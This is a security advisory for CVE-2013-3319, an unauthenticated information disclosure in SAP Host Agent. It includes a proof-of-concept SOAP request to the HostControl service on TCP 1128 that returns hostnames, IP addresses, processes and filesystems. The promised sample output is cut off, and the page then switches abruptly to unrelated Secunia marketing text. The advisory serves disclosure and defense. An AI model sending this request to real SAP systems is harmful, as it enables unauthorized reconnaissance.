# CVE-2013-3319 - SAP Host Agent Information Disclosure

## 1. Vulnerability Properties

**Title:**Â SAP Host Agent Information Disclosure

**CVE ID:**Â CVE-2013-3319

**CVSSv2 Base Score:**Â 5.0 (AV:N/AC:L/AU:N/C:P/I:N/A:N)

**Vendor:** SAP (http://www.sap.com)

**Products:** SAP Netweaver

**Advisory Release Date:** 9 July 2013

**Advisory URL:**Â Â http://labs.integrity.pt/advisories/cve-2013-3319/

**Credits:Â**Discovery and PoC by Bruno Morisson <bm[at]integrity.pt>

## 2. Vulnerability Summary

A remote unauthenticated attacker may obtain internal information regarding the underlying operating system by sending an unauthenticated SOAP request to SAP HostControl service (tcp 1128). It is possible to obtain the following information:

Hostname(s);

IP Address(es);

Operating System version;

Running Processes details (including name, pid and partial usernames)

Filesystems;

Network Interface information;

## 3. Technical Details

The vulnerability can be confirmed by sending the following SOAP request invoking the GetComputerSystem method, without any authentication to the SAP Host Control Service, running on TCP port 1128:

```
<?xml version="1.0" encoding="utf-8"?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/"xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xs="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header>
<sapsess:Session xlmns:sapsess="http://www.sap.com/webas/630/soap/features/session/">
<enableSession>true</enableSession></sapsess:Session>
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:GetComputerSystem xmlns:ns1="urn:SAPHostControl">
<aArguments><item><mKey>provider</mKey><mValue>saposcol</mValue></item></aArguments>
</ns1:GetComputerSystem>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

The server will then reply with the internal information. Due to the XML response being very long, as an example, here's a parsed output of the information returned:

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
